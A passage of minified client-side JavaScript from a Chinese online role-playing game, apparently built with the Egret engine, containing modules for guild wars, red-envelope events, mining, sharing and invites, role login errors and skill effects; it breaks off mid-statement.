P;!function(t){t[t.WorldBoss=1]="WorldBoss",t[t.PublicBoss=2]="PublicBoss",t[t.ShenyuBoss=4]="ShenyuBoss",t[t.GwBoss=5]="GwBoss",t[t.XcBoss=8]="XcBoss",t[t.KuafuBoss=9]="KuafuBoss"}(P=e.RexueID||(e.RexueID={})),window.RexueID=P,window.RexueID=P,window.RexueDideCT=A,Systemap.RexueDideCT=function(){return A.ins()}},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.QingDianMainWin2=void 0;var n=i(1),o=i(84),s=i(17),a=i(56),r=i(2),l=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="QingDianMain2Skin",e.curActType=1002,e.evsIdx=0,e}return __extends(e,t),e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=!window.platform.isshen();return i||r.TipsCT.ins().showTips(gettext("活动未开启")),i},e.prototype.skinComplete=function(){this.addChangeEvent(this.eTab,this.onTabTouch)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];t[0]&&(this.evsIdx=t[0]),this.curActType=t[1]?t[1]:a.Activity1002PageStyle.Activity1002,this.FuliMain1002.curActType=this.curActType,this.initTab(),observe(this,this.updateTabRp,s.RedPointBaseSys.ins().RpChange),this.updateTabRp()},e.prototype.updateTabRp=function(){var t;null===(t=this.eTab)||void 0===t?void 0:t.updateReds()},e.prototype.initTab=function(){var t,e=this.eVs.getChildIndex(this.FuliMain1002);t=this.curActType==a.Activity1003PageStyle.Activity1003?a.Activity1003PageStyle:this.curActType==a.Activity1004PageStyle.Activity1004?a.Activity1004PageStyle:a.Activity1002PageStyle,e>=0&&(!o.FuLiCT.ins().isHasFuliActivity(t)||window.platform.isshen())&&this.eVs.removeChildAt(e),this.eTab.selectedIndex=this.evsIdx,this.eVs.selectedIndex=this.evsIdx,this.eTab.validateNow();var i=this.eTab.getElementAt(this.evsIdx),n=this.eVs.getElementAt(this.evsIdx);i.bg.source=n.tabImg+"1"},e.prototype.onTabTouch=function(){if(this.evsIdx!=this.eTab.selectedIndex){var t=this.eTab.getElementAt(this.evsIdx),e=this.eVs.getElementAt(this.evsIdx);t.bg.source=e.tabImg;var i=this.eTab.getElementAt(this.eTab.selectedIndex),n=this.eVs.getElementAt(this.eTab.selectedIndex);i.bg.source=n.tabImg+"1",this.evsIdx=this.eTab.selectedIndex}},e}(n.BaseView);e.QingDianMainWin2=l,window.QingDianMainWin2=l,__reflect(l.prototype,"QingDianMainWin2",[]),window.QingDianMainWin2=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EnvelopeType=e.EnvelopeData=e.RedEnvelope=e.ActivityType12Data=void 0;var n=i(55),o=i(8),s=i(17),a=i(0),r=i(4),l=i(13),h=i(7),u=i(9),p=i(33),d=function(t){function e(i,n){var o=t.call(this,i)||this;return o.envelopeSum=e.maxEnvelope,o.SecondCount=0,o.init(i,n),o.initRps(),o}return __extends(e,t),e.prototype.init=function(t,e){this.score=t.readInt();var i=t.readShort();this.logs=[];for(var n=0;i>n;n++){var o=t.readShort(),s=t.readString(),a=t.readInt();this.logs.push({name:s,serverId:a,index:o})}-1==u.Activity.ins().activityTimers.indexOf(e)&&u.Activity.ins().activityTimers.push(e)},e.prototype.initRps=function(){var t=this;this.rp=new s.RedPoint(function(){return t.isOpenActivity()?t.checkRedPoint():!1},u.Activity.ins().postRewardResult,u.Activity.ins().postActivityIsGetAwards)},e.prototype.update=function(t){var e=t.readUnsignedShort(),i=t.readInt(),n=t.readInt(),o=t.readShort(),s=[],a=l.SubRoles.ins().getSubRoleByIndex(0);s.push({job:a.job,sex:a.sex,name:r.ActorCC.myName,yb:i,gold:n});for(var h=0;o>h;h++){var p=t.readShort(),d=t.readShort(),c=t.readString(),f=t.readInt();r.ActorCC.myName!=c&&s.push({job:p,sex:d,name:c,yb:f,gold:0})}u.Activity.ins().postGetRedEnvelope(this.id,e,i,n,s)},Object.defineProperty(e.prototype,"envelopeData",{get:function(){return this._envelopeData=this._envelopeData?this._envelopeData:[],this._envelopeData},set:function(t){t.sort(this.sortTimer),this._envelopeData=t},enumerable:!1,configurable:!0}),e.prototype.sortTimer=function(t,e){return n.Algorithm.sortAsc(t.timer,e.timer)},e.prototype.checkClear=function(){this.envelopeData.length>=this.envelopeSum?(this.SecondCount=0,this.clearEnvelopeData(),this.envelopeSum>e.maxEnvelope&&(this.envelopeSum=this.envelopeData.length+e.maxEnvelope)):this.SecondCount>10&&this.envelopeSum>e.maxEnvelope?(this.SecondCount=0,this.envelopeSum=e.maxEnvelope):this.SecondCount>60&&this.envelopeData.length<e.maxEnvelope&&(this.SecondCount=0,this.clearEnvelopeData()),this.SecondCount++},e.prototype.clearEnvelopeData=function(){for(var t=0;t<this.envelopeData.length;)(!this.envelopeData[t]||this.envelopeData[t].isOverTimer())&&this.envelopeData.splice(t,1),t++},e.prototype.clearAll=function(){this.envelopeData=[],this.envelopeSum=e.maxEnvelope},e.prototype.popEnvelope=function(t){for(var e=0;e<this.envelopeData.length;){if(!this.envelopeData[e]||this.envelopeData[e].id==t){this.envelopeData.splice(e,1);break}e++}},e.prototype.canReward=function(){return this.checkRedPoint()},e.prototype.isOpenActivity=function(){var t=Math.floor((o.DateUtils.formatMiniDateTime(this.startTime)-h.GameServerCC.serverTime)/1e3),e=Math.floor((o.DateUtils.formatMiniDateTime(this.endTime)-h.GameServerCC.serverTime)/1e3);return 0>t&&e>0?!0:!1},e.prototype.checkRedPoint=function(){var t=a.GlobalConfig.ActivityType12Config[this.id];for(var e in t)if(this.score>=t[e].score)return!0;return!1},e.prototype.getRemainTime=function(){var t,e=Math.floor((o.DateUtils.formatMiniDateTime(this.startTime)-h.GameServerCC.serverTime)/1e3),i=Math.floor((o.DateUtils.formatMiniDateTime(this.endTime)-h.GameServerCC.serverTime)/1e3);return t=e>=0?gettext("活动未开启"):0>=i?gettext("活动已结束"):o.DateUtils.getFormatBySecond(i,o.DateUtils.TIME_FORMAT_5,3)},e.maxEnvelope=10,e}(p.ActivityBaseData);e.ActivityType12Data=d,window.ActivityType12Data=d,__reflect(d.prototype,"ActivityType12Data",[]);var c=function(){function t(){this.id=0,this.timer=0}return t.prototype.isOverTimer=function(){var t=Math.floor((o.DateUtils.formatMiniDateTime(this.timer)-h.GameServerCC.serverTime)/1e3);return 0>=t?!0:!1},t}();e.RedEnvelope=c,window.RedEnvelope=c,__reflect(c.prototype,"RedEnvelope",[]);var f=function(){function t(){this.id=0,this.eId=0,this.job=0,this.sex=0,this.index=0,this.serverId=0,this.name="",this.desc=""}return t}();e.EnvelopeData=f,window.EnvelopeData=f,__reflect(f.prototype,"EnvelopeData",[]);var g;!function(t){t[t.SEND=1]="SEND",t[t.GET=2]="GET"}(g=e.EnvelopeType||(e.EnvelopeType={})),window.EnvelopeType=g},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.RoleMgr=void 0;var n=i(14),o=i(23),s=i(2),a=function(t){function e(){var e=t.call(this)||this;return e.errorCode=["",gettext("sql错误"),gettext("用户没登陆"),gettext("游戏服务没准备好"),gettext("角色上一次保存数据是否出现异常"),gettext("客户端选择角色的常规错误"),gettext("角色名称重复"),gettext("角色不存在"),gettext("错误的性别"),gettext("随机生成的名字已经分配完"),gettext("客户端上传的角色阵营参数错误"),gettext("客户端上传的角色职业参数错误"),gettext("名称无效，名称中包含敏感字符或长度不合法"),gettext("如果玩家是帮主，不能删除该角色，需要玩家退帮"),gettext("已经登陆到其他服务器"),gettext("已经超过最大可建角色数量")],e.filterStr=["<",">","&","|"],e.sysId=PackageID.Login,e.regNetMsg(1,e.login),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.login=function(t){var e=t.readByte();console.log("@@255-1返回=",e),3==e&&(Socket.ins().close(),entry.Tips.show(gettext("账号已在别处登录"),[gettext("确定")],[platform.exit]),o.GameLogic.ins().stopHeartbeat())},e.prototype.showErrorTips=function(t){0!=t&&s.TipsCT.ins().showTips(this.errorCode[Math.abs(t)])},e.prototype.checkNameIsFilter=function(t){for(var e=0,i=this.filterStr;e<i.length;e++){var n=i[e];if(t.indexOf(n)>=0)return!0}return!1},e.prototype.checkName=function(t){return this.checkNameIsFilter(t)?(this.showErrorTips(-12),!1):!0},e}(n.BaseSystem);e.RoleMgr=a,window.RoleMgr=a,__reflect(a.prototype,"RoleMgr",[]),Systemap.RoleMgr=function(){return a.ins()},window.RoleMgr=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GuildWar=void 0;var n=i(8),o=i(14),s=i(4),a=i(20),r=i(2),l=i(709),h=function(t){function e(){var e=t.call(this)||this;return e.sysId=PackageID.GuildWar,e.regNetMsg(1,e.postRedBagInfo),e.regNetMsg(2,e.doSendRedBack),e.regNetMsg(3,e.doRobRedBack),e.regNetMsg(4,e.postJoinPlayBack),e.regNetMsg(5,e.doPlayNextCard),e.regNetMsg(6,e.doGetPointInfo),e.regNetMsg(7,e.doGetGongXunChange),e.regNetMsg(8,e.doGuildRankinfo),e.regNetMsg(9,e.postGuildPersonalRank),e.regNetMsg(10,e.doGuildWarKillInfo),e.regNetMsg(11,e.doGuildWarCityOwn),e.regNetMsg(12,e.postDayRewardInfo),e.regNetMsg(14,e.doMyActivityRankInfo),e.regNetMsg(15,e.postFlagInfoChange),e.regNetMsg(17,e.doGuildWarResult),e.regNetMsg(18,e.doHuDunInfoChange),e.regNetMsg(19,e.postAssignsReward),e.regNetMsg(20,e.postSendRewardSuccess),e.regNetMsg(21,e.postWinGuildInfo),e.regNetMsg(22,e.postGuildWarStarInfo),e.regNetMsg(26,e.doRankInfoChange),e.regNetMsg(27,e.doChangeAttrHandle),e.regNetMsg(28,e.doChangeShowList),e.regNetMsg(29,e.doPointRewardInfo),e.regNetMsg(31,e.doDoorEndtime),e.regNetMsg(32,e.doTalkMaxPoint),e.regNetMsg(33,e.postKillHuman),e.regNetMsg(34,e.postHeFuBelong),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.getModel=function(){return this._guildWarModel||(this._guildWarModel=new l.GuildWarModel),this._guildWarModel},e.prototype.requestSendRedBag=function(t,e){var i=this.getBytes(2);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},e.prototype.requestRobRedBag=function(){var t=this.getBytes(3);this.sendToServer(t)},e.prototype.requestJoinAc=function(){var t=this.getBytes(4);this.sendToServer(t)},e.prototype.requestPlayNextMap=function(t){var e=this.getBytes(5);e.writeByte(t),this.sendToServer(e)},e.prototype.requestGuildRank=function(){var t=this.getBytes(8);this.sendToServer(t)},e.prototype.requestOwnGuildRank=function(){var t=this.getBytes(9);this.sendToServer(t)},e.prototype.postGuildPersonalRank=function(t){for(var e=[],i=t.readInt(),n=0;i>n;n++){var o=new l.RankGuildInfo;o.parse(t),e[n]=o}return e},e.prototype.requestDayReward=function(t){var e=this.getBytes(13);e.writeInt(t),this.sendToServer(e)},e.prototype.requestOwnMyGuildRank=function(){var t=this.getBytes(14);this.sendToServer(t)},e.prototype.requestStartGetFlag=function(){var t=this.getBytes(16);this.sendToServer(t)},e.prototype.requestWinGuildInfo=function(){var t=this.getBytes(21);this.sendToServer(t)},e.prototype.postRedBagInfo=function(t){this.getModel().getRedbagInfo(t)},e.prototype.doSendRedBack=function(t){t.readBoolean()&&(win.close("RedBagWin"),r.TipsCT.ins().showTips(gettext("|C:0x35e62d&T:发送红包成功|")))},e.prototype.doRobRedBack=function(t){t.readBoolean()&&(win.close("RedBagWin"),win.open("RedBagDetailsWin",1))},e.prototype.postJoinPlayBack=function(t){var e=t.readBoolean();this.getModel().doorDie=t.readBoolean(),this.getModel().rewardFlag=t.readByte(),e&&(win.close("GuildWarMainWin"),win.close("GuildMap"))},e.prototype.doPlayNextCard=function(t){},e.prototype.doGetPointInfo=function(t){this.getModel().ownPoint=t.readInt(),this.getModel().guildPoint=t.readInt();var e=t.readInt();e>0&&r.TipsCT.ins().showTips(gettext("获得 {0} 积分",e)),this.postPointUpdate()},e.prototype.postPointUpdate=function(){},e.prototype.doGetGongXunChange=function(t){this.getModel().gongXun=t.readInt(),this.postPointUpdate()},e.prototype.doGuildRankinfo=function(t){this.getModel().decodeGuildRankInfo(t)},e.prototype.doGuildWarKillInfo=function(t){var e=t.readInt();this.getModel().killName=t.readString(),this.getModel().killGuild=t.readString(),win.open("GuileWarReliveWin",2,e)},e.prototype.doGuildWarCityOwn=function(t){this.getModel().cityOwn=t.readString(),this.postCityownChange()},e.prototype.postCityownChange=function(){},e.prototype.doMyActivityRankInfo=function(t){this.getModel().decodeMyGuildRankInfo(t)},e.prototype.postDayRewardInfo=function(t){this.getModel().canGetDay=t.readBoolean(),this.getModel().getDayReward=t.readBoolean(),this.getModel().rewardDay=t.readInt()},e.prototype.postFlagInfoChange=function(t){this.getModel().flagAcId=0,this.getModel().flagStatu=t.readShort(),0==this.getModel().flagStatu?this.getModel().endTime=t.readInt():2==this.getModel().flagStatu&&(this.getModel().flagName=t.readString(),this.getModel().flagAcId=t.readInt(),this.getModel().endTime=t.readInt(),this.getModel().flagGuild=t.readString(),this.getModel().flagAcId==s.ActorCC.actorID&&r.TipsCT.ins().showTips(gettext("开始采集")))},e.prototype.doGuildWarResult=function(t){this.getModel().decodeGulidWarResult(t)},e.prototype.doHuDunInfoChange=function(t){this.postHudunInfo(t.readInt(),t.readInt())},e.prototype.postHudunInfo=function(t,e){return[t,e]},e.prototype.postAssignsReward=function(t){this.getModel().guildWarRank=t.readInt(),this.getModel().canSendReward=t.readBoolean(),this.getModel().rewardFlag=t.readByte()},e.prototype.sendFenReward=function(t,e){var i=this.getModel().sendNumList,n=this.getBytes(20);n.writeInt(t);for(var o=1;t>=o;o++){n.writeInt(o);var s=o-1,a=e[s].length;n.writeInt(a);for(var r=0;a>r;r++){var l=e[s][r];n.writeInt(l.roleID),n.writeInt(i[s][r])}}this.sendToServer(n)},e.prototype.postSendRewardSuccess=function(t){t.readBoolean()&&(win.close("SelectMemberRewardWin"),this.getModel().canSendReward=!1,r.TipsCT.ins().showTips(gettext("奖励已分配完")))},e.prototype.postWinGuildInfo=function(t){this.getModel().winGuildInfo||(this.getModel().winGuildInfo=new l.WinGuildInfo),this.getModel().winGuildInfo.parse(t)},e.prototype.postGuildWarStarInfo=function(t){this.getModel().isWatStart=t.readBoolean(),this.getModel().startTime=n.DateUtils.formatMiniDateTime(t.readInt())/1e3,this.getModel().acEndTime=t.readInt()},e.prototype.sendPlayLotteryInfo=function(){var t=this.getBytes(25);this.sendToServer(t)},e.prototype.doRankInfoChange=function(t){this.getModel().rankListChange(t)},e.prototype.doChangeAttrHandle=function(t){if(14==a.GameMap.fbType){var e=t.readDouble();this.getModel().attHandle!=e&&(this.getModel().attHandle=e),this.postWeixieChange(1)}},e.prototype.postWeixieChange=function(t){return t},e.prototype.postGuildRedPointChange=function(t){return t},e.prototype.doChangeShowList=function(t){if(14==a.GameMap.fbType){var e=t.readDouble();this.getModel().changeWeiXieList(e,!1),this.getModel().changecanPlayList(e,!1),this.getModel().setMyGuildNum(e,!1),this.getModel().attHandle&&this.getModel().attHandle==e&&(this.getModel().attHandle=0,console.log("cancel------------:"+e))}},e.prototype.doPointRewardInfo=function(t){this.getModel().decodePointRewardInfo(t)},e.prototype.sendPointReward=function(){var t=this.getBytes(30);this.sendToServer(t)
},e.prototype.doDoorEndtime=function(t){this.getModel().doEndDoorTime(t.readByte())},e.prototype.postLotteryPoint=function(t){return t},e.prototype.doTalkMaxPoint=function(t){t.readInt(),t.readString()},e.prototype.postKillHuman=function(t){var e=t.readInt();return e},e.prototype.postHeFuBelong=function(t){var e=t.readShort();this.GuildNameBelongs=[];for(var i=0;e>i;i++){var n=t.readString();this.GuildNameBelongs.push(n)}},e.prototype.sendHeFuBelong=function(){this.sendBaseProto(34)},e.prototype.postLotteryMaxPost=function(t,e){return[t,e]},e.prototype.postMyRankChange=function(){},e.prototype.postPointRewardChange=function(){},e.prototype.postCanplayChange=function(){},e.prototype.postRankListChange=function(){},e.prototype.postGuildNumChange=function(){},e.prototype.postSendListChange=function(){},e.prototype.postRankInfo=function(){},__decorate([post()],e.prototype,"postGuildPersonalRank",null),__decorate([post()],e.prototype,"postRedBagInfo",null),__decorate([post()],e.prototype,"postJoinPlayBack",null),__decorate([post()],e.prototype,"postPointUpdate",null),__decorate([post()],e.prototype,"postCityownChange",null),__decorate([post()],e.prototype,"postDayRewardInfo",null),__decorate([post()],e.prototype,"postFlagInfoChange",null),__decorate([post()],e.prototype,"postHudunInfo",null),__decorate([post()],e.prototype,"postAssignsReward",null),__decorate([post()],e.prototype,"postSendRewardSuccess",null),__decorate([post()],e.prototype,"postWinGuildInfo",null),__decorate([post()],e.prototype,"postGuildWarStarInfo",null),__decorate([post()],e.prototype,"postWeixieChange",null),__decorate([post()],e.prototype,"postGuildRedPointChange",null),__decorate([post()],e.prototype,"postLotteryPoint",null),__decorate([post()],e.prototype,"postKillHuman",null),__decorate([post()],e.prototype,"postHeFuBelong",null),__decorate([post()],e.prototype,"postLotteryMaxPost",null),__decorate([post()],e.prototype,"postMyRankChange",null),__decorate([post()],e.prototype,"postPointRewardChange",null),__decorate([post()],e.prototype,"postCanplayChange",null),__decorate([post()],e.prototype,"postRankListChange",null),__decorate([post()],e.prototype,"postGuildNumChange",null),__decorate([post()],e.prototype,"postSendListChange",null),__decorate([post()],e.prototype,"postRankInfo",null),e}(o.BaseSystem);e.GuildWar=h,window.GuildWar=h,__reflect(h.prototype,"GuildWar",[]),Systemap.GuildWar=function(){return h.ins()},window.GuildWar=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.Mine=void 0;var n=i(14),o=i(2),s=i(12),a=i(15),r=i(30),l=i(0),h=i(10),u=i(4),p=i(8),d=i(58),c=function(t){function e(){var e=t.call(this)||this;return e.power=0,e.rewards=[],e.areaId=0,e.logs=[],e.checkAreaId=0,e.sysId=PackageID.Mine,e.regNetMsg(1,e.postInfo),e.regNetMsg(2,e.postAreaInfo),e.regNetMsg(4,e.doLogs),e.regNetMsg(5,e.doRewards),e.regNetMsg(6,e.postPKResult),e.regNetMsg(7,e.postPosInfo),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.postInfo=function(t){this.power=t.readShort(),this.posId=t.readShort(),this.rewards=[];for(var e=t.readUnsignedByte(),i=0;e>i;i++){var n=new r.RewardData;n.type=1,n.id=t.readInt(),n.count=t.readInt(),this.rewards.push(n)}},e.prototype.sendExit=function(){var t=this.getBytes(1);this.sendToServer(t)},e.prototype.sendAreaById=function(t){var e=this.getBytes(2);e.writeByte(t),this.sendToServer(e)},e.prototype.getEnterDesc=function(t){var e;if(!this._descInfo){this._descInfo={};for(var i in l.GlobalConfig.KuangAreaMsgConfig){!this._descInfo[+i]&&(this._descInfo[+i]=[]);var n=l.GlobalConfig.KuangAreaMsgConfig[i];for(var o in n)this._descInfo[+i].push(null===(e=n[o])||void 0===e?void 0:e.msg)}}if(!this._descInfo[t]||0==this._descInfo[t].length)return null;var s=Math.floor(Math.random()*(this._descInfo[t].length-1));return this._descInfo[t][s]},e.prototype.postAreaInfo=function(t){this.areaId=t.readByte();var e=this.getEnterDesc(this.areaId);e=d.LangUtils.formatStr(e,[u.ActorCC.myName]),this.logs.unshift(e),this.postLogs(),!this.areaInfos&&(this.areaInfos={});for(var i=t.readUnsignedShort(),n=0;i>n;n++){var o={areaId:this.areaId,posId:t.readUnsignedShort(),actorId:t.readInt(),name:t.readString()};!this.areaInfos[this.areaId]&&(this.areaInfos[this.areaId]={}),this.areaInfos[this.areaId][o.posId]=o}},e.prototype.sendHoldPos=function(t){var e=this.getBytes(3);e.writeShort(t),this.sendToServer(e),this.sendAreaById(this.areaId),this.sendPosInfo({posId:t,areaId:this.areaId})},e.prototype.doLogs=function(t){this.logs.unshift(t.readString()),this.postLogs()},e.prototype.doRewards=function(t){for(var e="",i=t.readUnsignedByte(),n=0;i>n;n++){var o=(t.readByte(),t.readInt()),s=t.readInt(),a=l.GlobalConfig.ItemConfig[o];a&&(e+=(e?",":"")+"|C:"+h.ItemUtil.getQualityColor(h.ItemUtil.getQuality2(a))+"&T:"+a.name+"*"+s+"| ")}e&&(e=gettext("{0}挖矿了",u.ActorCC.myName)+e,this.logs.unshift(e),this.postLogs())},e.prototype.postLogs=function(){this.logs.length=Math.min(this.logs.length,50)},e.prototype.postPKResult=function(t){var e=t.readByte();win.open("LadderResultWin",1==e),this.sendAreaById(this.areaId)},e.prototype.sendPosInfo=function(t){var e=t.posId,i=t.areaId,n=this.getBytes(7);n.writeShort(e),this.sendToServer(n),this.checkAreaId=i},e.prototype.postPosInfo=function(t){for(var e=[],i={areaId:this.checkAreaId,posId:t.readShort(),actorId:t.readInt(),name:t.readString(),job:t.readByte(),power:t.readInt(),start:p.DateUtils.formatMiniDateTime(t.readInt()),save:p.DateUtils.formatMiniDateTime(t.readInt()),firePower:t.readDouble(),rewards:e},n=t.readByte(),o=0;n>o;o++){var s=new r.RewardData;s.type=1,s.id=t.readInt(),s.count=t.readInt(),e.push(s)}return i},e.openCheck=function(t){var e=s.OpenSystem.ins().checkSysOpen(a.SystemType.WaKuang);return t&&!e&&o.TipsCT.ins().showTips(s.OpenSystem.ins().getNoOpenTips(a.SystemType.WaKuang)),e},e.prototype.getCfgByAreaId=function(t){for(var e in l.GlobalConfig.KuangAreaConfig){var i=l.GlobalConfig.KuangAreaConfig[e];if(i.area==t)return i}return null},e.prototype.getMyMineArea=function(){return this.posId?Math.floor(this.posId/1e3):-1},__decorate([post()],e.prototype,"postInfo",null),__decorate([post()],e.prototype,"postAreaInfo",null),__decorate([post()],e.prototype,"postLogs",null),__decorate([post()],e.prototype,"postPKResult",null),__decorate([post()],e.prototype,"postPosInfo",null),e}(n.BaseSystem);e.Mine=c,window.Mine=c,__reflect(c.prototype,"Mine",[]),Systemap.Mine=function(){return c.ins()},window.Mine=c},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.BagFullTipsWin=void 0;var n=i(1),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="FullBagSkin",e}return __extends(e,t),e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.addTouchEvent(this.closeBtn,this.onTap),this.addTouchEvent(this.sureBtn,this.onTap);var i=20;t[0]&&(i=t[0]),this.numText.text=gettext("背包空间不足{0}，请先清理背包，以免不能获得奖励。",i)},e.prototype.removeDisplay=function(){this.removeTouchEvent(this.closeBtn,this.onTap),this.removeTouchEvent(this.sureBtn,this.onTap)},e.prototype.onTap=function(t){switch(t.currentTarget){case this.closeBtn:win.close(this);break;case this.sureBtn:win.close(this),win.open("BagWin",0,1)}},e}(n.BaseView);e.BagFullTipsWin=o,window.BagFullTipsWin=o,__reflect(o.prototype,"BagFullTipsWin",[]),window.BagFullTipsWin=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ShareCT=void 0;var n=i(14),o=i(1372),s=i(13),a=i(4),r=i(2),l=i(8),h=function(t){function e(){var e=t.call(this)||this;return e.dayCount=0,e.firstGet=0,e.dayGet=0,e.cdTime=0,e.dayIndex=0,e.totalShare=[],e.friends=[],e.sysId=PackageID.pfActivity,e.regNetMsg(6,e.shareInfo),e.regNetMsg(10,e.shareTotal),e.regNetMsg(14,e.friendsLv),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.initLogin=function(){if(platform.options){var t=platform.options();if(t&&t.query&&t.query.actorId){console.log("options.query:"+t.query);var e=t.query;if(urlParam.isnew){var i=s.SubRoles.ins().getSubRoleByIndex(0),n="?actorid="+a.ActorCC.actorID+"&serverid="+urlParam.srvid+"&openId="+urlParam.openId;n+="&iactorid="+e.actorId+"&iserverid="+e.srvId+"&iopenId="+e.openId+"&param="+a.ActorCC.actorID+"_"+a.ActorCC.myName+"_"+(i?i.sex:0)+"_"+(i?i.job:0),Http.get(urlParam.reportRoot+"back/actor/invite"+n)}var o={actorid:a.ActorCC.actorID,serverid:urlParam.srvid,openId:urlParam.openId,iactorid:e.actorId,iserverid:e.srvId,iopenId:e.openId};Http.post(urlParam.reportRoot+"back/actor/invite/log",o)}}},e.prototype.share=function(){return __awaiter(this,void 0,void 0,function(){var t=this;return __generator(this,function(e){return window.platform.share({withShareTicket:!0,success:function(e){return e.shareTickets?(r.TipsCT.ins().showCenterTips(gettext("分享成功")),void t.sendShareSuc()):void r.TipsCT.ins().showCenterTips(gettext("必须分享到群"))},fail:function(){r.TipsCT.ins().showCenterTips(gettext("分享失败"))}}),[2]})})},e.prototype.sendGetFirst=function(){this.sendBaseProto(7)},e.prototype.sendShareSuc=function(){this.sendBaseProto(8)},e.prototype.sendGetDay=function(){this.sendBaseProto(9)},e.prototype.shareInfo=function(t){var e;e=t.readInts(5),this.dayCount=e[0],this.dayGet=e[1],this.firstGet=e[2],this.cdTime=e[3],this.dayIndex=e[4],this.cdTime=l.DateUtils.formatMiniDateTime(this.cdTime)},e.prototype.shareTotal=function(t){for(var e=t.readInt(),i=0;e>i;i++){var n=t.readInt();this.totalShare[n]=[n,t.readInt(),t.readInt()]}},e.prototype.sendGetTotal=function(t){var e=this.getBytes(11);e.writeInt(t),this.sendToServer(e)},e.prototype.friendsLv=function(t){this.friends.length=0;for(var e=t.readInt(),i=0;e>i;i++)this.friends.push(new o.ShareLvData(t))},e.prototype.sendGetFriends=function(t){var e=this.getBytes(15);e.writeInt(t),this.sendToServer(e)},__decorate([post()],e.prototype,"shareInfo",null),__decorate([post()],e.prototype,"shareTotal",null),__decorate([post()],e.prototype,"friendsLv",null),e}(n.BaseSystem);e.ShareCT=h,window.ShareCT=h,__reflect(h.prototype,"ShareCT",[]),Systemap.ShareCT=function(){return h.ins()},window.ShareCT=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.NoticeListRenderer=void 0;var n=i(18),o=i(5),s=i(3),a=i(0),r=i(10),l=i(56),h=function(t){function e(){var e=t.call(this)||this;return e.job=["",gettext("战士"),gettext("法师"),gettext("道士"),gettext("刺客"),gettext("弓手")],e.skinName="HuntListRendererSkin",e}return __extends(e,t),e.prototype.dataChanged=function(){var t="";switch(this.activityID=this.data.activityID,this.activityType=this.data.activityType,this.actType=this.data.actType,this.activityType){case l.ActivityDataType._17:break;default:var e=this.data.name,i=this.data.index,s="",h=n.ColorUtil.NORMAL_COLOR,u=a.GlobalConfig.ItemConfig[i];if(!u)return;s=u.name;var p=r.ItemUtil.getQuality2(u);h=r.ItemUtil.getQualityColor(p);var d=r.ItemUtil.getType(u);0==d&&u&&(s+=u.zsLevel>0?gettext("({0}转 ",u.zsLevel):gettext("({0}级 ",u.level),s+=this.job[r.ItemUtil.getJob(u)]+")"),t="<font color = '#12b2ff'>"+e+"</font> "+(this.data.des?this.data.des:gettext("获得"))+" <font color='"+h+"'>"+s+"</font>"}this.showText.textFlow=o.TextFlowMaker.generateTextFlow(t)},e.QUALITY_COLOR=["#e2dfd4","#35e62d","#d242fb","#ff750f","#f3311e","#ffd93f"],e}(s.BaseItemRender);e.NoticeListRenderer=h,window.NoticeListRenderer=h,__reflect(h.prototype,"NoticeListRenderer",[]),window.NoticeListRenderer=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.SkillEffConfig=e.EffParam=e.SkillEffPlayer=void 0;var n=i(50),o=i(21),s=i(146),a=i(70),r=i(16),l=i(20),h=i(193),u=i(37),p=i(7),d=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),Object.defineProperty(e,"urlSkill",{get:function(){return""+RES_DIR_SKILL},enumerable:!1,configurable:!0}),Object.defineProperty(e,"urlSkillEff",{get:function(){return""+RES_DIR_SKILLEFF},enumerable:!1,configurable:!0}),e.playConfigs=function(t,i){var n=this;if(!this.setTimeout)return void console.warn("SkillEffPlayer.setTimeout未设置");for(var p=function(p){var c=t[p];c=f.initValue(c),d.setTimeout(c.delay/i.rate,function(){var t,p,d,f,g,m;if(c.type>50&&100!=c.type){var v=n["type"+c.type];return void(v&&v.call(n,i,c))}var y=new o.MovieClip;y.rate=c.playSpeed*(c.isRate?i.rate:1);var C=e.urlSkillEff+c.effectId+(c.isDir?s.DirUtil.get5DirBy8Dir(i.initParam.dir):""),T=C+i.append;if(y.playFile(T,c.playCount),y.x=c.x,y.y=c.y,i.offset&&(y.x+=i.offset.x,y.y+=i.offset.y),"string"==typeof c.rotation){var b=c.rotation+"",w=b.split("|"),I=+w[0],_=+w[1]-+w[0];y.rotation=Math.random()*_+I}else y.rotation=c.rotation;y.scaleX=c.scaleX*(c.isDir&&s.DirUtil.isScaleX(i.initParam.dir)?-1:1),y.scaleY=c.scaleY,y.alpha=c.alpha,y.anchorOffsetX=c.cx,y.anchorOffsetY=c.cy;var S=c.layer;if(c.dirPos.length&&c.dirPos[i.initParam.dir]){var x=c.dirPos[i.initParam.dir];isNaN(x.x)||(y.x+=x.x),isNaN(x.y)||(y.y+=x.y),isNaN(x.layer)||(S=x.layer),isNaN(x.rotation)||(y.rotation+=x.rotation),isNaN(x.scaleX)||(y.scaleX=x.scaleX),isNaN(x.scaleY)||(y.scaleY=x.scaleY),isNaN(x.cx)||(y.anchorOffsetX=x.cx),isNaN(x.cy)||(y.anchorOffsetY=x.cy)}if(c.isRot&&i.target){var D=c.isInit?{x:i.initParam.tar[0].x,y:i.initParam.tar[0].y}:i.target[0],A=a.MathUtils.getAngle(a.MathUtils.getRadian2(i.source.x,i.source.y,D.x,D.y));y.rotation=A+y.rotation}if(c.tolock){i.fubenID=l.GameMap.fubenID;var 